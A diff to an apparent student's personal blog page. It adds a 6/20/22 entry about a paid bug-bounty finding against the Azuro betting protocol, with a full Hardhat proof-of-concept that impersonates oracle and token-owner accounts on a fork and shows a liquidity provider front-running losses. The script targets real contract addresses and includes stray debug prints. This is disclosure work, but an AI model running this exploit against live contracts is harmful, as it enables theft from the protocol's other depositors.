@@ -37,20 +37,130 @@ Prometheus Sci Bowl: Eliminated first round, unfortunately
 USACO Open - Didn't pass, recieved 750 out of the 800 required points
     //(Note: I feel hella depressed)
 
-Academic Super Bowl State 2nd in Math, 1rst in Science [Picture here], two teams tied for first place, but our team managed to snatch the banner before the other did :p
+Academic Super Bowl State 2nd in Math, 1rst in Science [Picture here], two teams tied for first place.
 
 Ended my track season w/ a 5:08 mile, not yet sub 5, but close.
 
-Here's a miniature I recentely painted up, pretty proud of it [Picture here]
-
-Going to have to do a lot this Summer, so I'm pretty excited for it! Probably also going to start lifting and/or playing the guitar and/or learn how to drive.
-
-Waiting for the Kingdom Death Summer Shop Update, I missed the Spring Update by a few hours, and the thing I wanted sold out.
-
-I should probably start adding dates to this updates.
-
 5/21/22 Running in the rain is the best [Picture here]
         Bugs are the coolest in any game, WarHammer 40k, StartCraft, MTG, etc. [Picture here]
+
+6/20/22 Recently starting auditing smart contracts on immunefi with user @izhuer. Today, I just recieved my first payout from auditing Azuro Procotol(https://azuro.org/). Included is a POC of that contract and an explanation:
+```const ethers = hre.ethers;
+
+async function main() {
+    // get malicious LP and user
+    const [LP1, LP2, user] = await ethers.getSigners();
+
+    // get constract
+    pool = await ethers.getContractAt("LP", "0x31acF17c04f27Bb7DE1cf2fDfa8785950A05b80A");
+    azuro = await ethers.getContractAt("Core", "0x7ce09c4401694F80b4352407A2df59A2D339C32A");
+    azuroBet = await ethers.getContractAt("AzuroBet", "0x8ca27099AD224984e90Fd95D8de30D7B1cF523eb"); 
+
+    // send some USDT to LPs and user
+    USDT = await ethers.getContractAt("TestERC20", "0xb64a99a6a34a719b323655cee9fc0d3f61b5d7ef");
+    USDTOwnerAddress = await USDT.owner();
+    console.log("[*] the owner of USDT:", USDTOwnerAddress);
+    await hre.network.provider.request({
+          method: "hardhat_impersonateAccount",
+          params: [USDTOwnerAddress],
+    });
+    USDTOwner = await ethers.getSigner(USDTOwnerAddress);
+    await USDT.connect(USDTOwner).mint(LP1.address, ethers.utils.parseEther("20000.0"));
+    await USDT.connect(USDTOwner).mint(LP2.address, ethers.utils.parseEther("20000.0"));
+    await USDT.connect(USDTOwner).mint(user.address, ethers.utils.parseEther("40000.0"));
+    await USDT.connect(LP1).approve(pool.address, ethers.constants.MaxUint256);
+    await USDT.connect(LP2).approve(pool.address, ethers.constants.MaxUint256);
+    await USDT.connect(user).approve(pool.address, ethers.constants.MaxUint256);
+
+    // impersonate an oracle
+    oracleAddress = '0x834dd1699f7ed641b8fed8a57d1ad48a9b6adb4e';
+    await hre.network.provider.request({
+          method: "hardhat_impersonateAccount",
+          params: [oracleAddress],
+    });
+    oracle = await ethers.getSigner(oracleAddress);
+
+    // impersonate a maintainer
+    maintainerAddress = '0x628d2714f912aab37e00304b5ff0283be7dff75f';
+    await hre.network.provider.request({
+          method: "hardhat_impersonateAccount",
+          params: [maintainerAddress],
+    });
+    maintainer = await ethers.getSigner(maintainerAddress);
+
+    // to make it simple, we let the only LP withdraw his funds
+    // Note that it is not really necessary, just for discussion simplifity
+    oldLPToken = await pool.nextNode() - 1;
+    oldLPAddress = "0x2c33fee397eea9a3573a31a2ea926424e35584a1";
+    await hre.network.provider.request({
+          method: "hardhat_impersonateAccount",
+          params: [oldLPAddress],
+    });
+    oldLP = await ethers.getSigner(oldLPAddress);
+    // XXX: we cannot withdraw it once, due to an overflow in LiquidityTree:123
+    await pool.connect(oldLP).withdrawLiquidity(oldLPToken, ethers.BigNumber.from('500000000000'));
+    await pool.connect(oldLP).withdrawLiquidity(oldLPToken, ethers.BigNumber.from('1000000000000'));
+    
+    // LP1 and LP2 add liquidity
+    LP1Token = await pool.nextNode();
+    await pool.connect(LP1).addLiquidity(ethers.utils.parseEther("20000.0"));
+    LP2Token = await pool.nextNode();
+    await pool.connect(LP2).addLiquidity(ethers.utils.parseEther("20000.0"));
+
+    // create a condition
+    const blockNum = await ethers.provider.getBlockNumber();
+    const block = await ethers.provider.getBlock(blockNum);
+    const targetTs = block.timestamp + 3600;
+    await azuro.connect(oracle).createCondition(
+        10, // oracleCondId
+        20, // scopeId,
+        [ethers.utils.parseEther("0.00005"), ethers.utils.parseEther("0.00005")], // odds
+        [1, 2], // outcomes
+        targetTs, // timestamp
+        "0x0000000000000000000000000000000000000000000000000000004141414141", // ipfsHash
+    );
+    conditionId = await azuro.oracleConditionIds(oracle.address, 10);
+    console.log("[*] the oracle create a condition - done");
+   
+    // user puts bet
+    await pool.connect(user).bet(conditionId, ethers.utils.parseEther("20000.0"), 1, targetTs, 0);
+    console.log("[*] the user bets - done");
+
+    // let's wait the condition start
+    await ethers.provider.send("evm_increaseTime", [144000])
+    await ethers.provider.send('evm_mine');
+    console.log("Hi");
+    frontrun = (process.env['AZURO_FRONTRUN'] = 'TRUE');
+    console.log("Bye");
+    if (frontrun) {
+        console.log("[*] LP1 front-run to avoid loss");
+        await pool.connect(LP1).withdrawLiquidity(LP1Token, ethers.BigNumber.from('1000000000000'));
+    }
+    console.log("Here");
+    // resolve condition
+    await azuro.connect(oracle).resolveCondition(10, 1);
+    console.log("[*] the oracle resolves condition - done");
+
+    if (!frontrun) {
+        console.log("[*] LP1 withdraws his funds");
+        await pool.connect(LP1).withdrawLiquidity(LP1Token, ethers.BigNumber.from('1000000000000'));
+    }
+    
+    console.log("[*] front-run attack enabled?", frontrun);
+    console.log("[*] amount LP1 can withdraw", await USDT.balanceOf(LP1.address));
+    console.log("[*] amount LP2 can withdraw", await pool.nodeWithdrawView(LP2Token));
+}
+
+main().then(() => process.exit(0)).catch((error) => {
+    console.error(error);
+    process.exit(1);
+});```
+
+the gist is that Azuro Protocol is a betting site, and betters can either place bets on events such as games, sports, etc, or place money into a reward pool, called the liquidity pool. Excess money from bets is placed into the pool, and if a bet needs more money, that is taken from the pool. Pool placers, or Liquidity poolers (LP) earn the percentage of the pool that they put in. 
+
+The bug was that an LP could see when bets would lose money in the pool, and could withdraw their input in the pool before the pool lost money, thus saving them from the monetary loss. This could be done by Front-Running the contract, simply providing more gas for a call so that it is prioritized over other calls.
+
+This is a really interesting bug, as I learned that function calls can be exploited due to gas loading.
 
 CV(https://www.google.com)
 
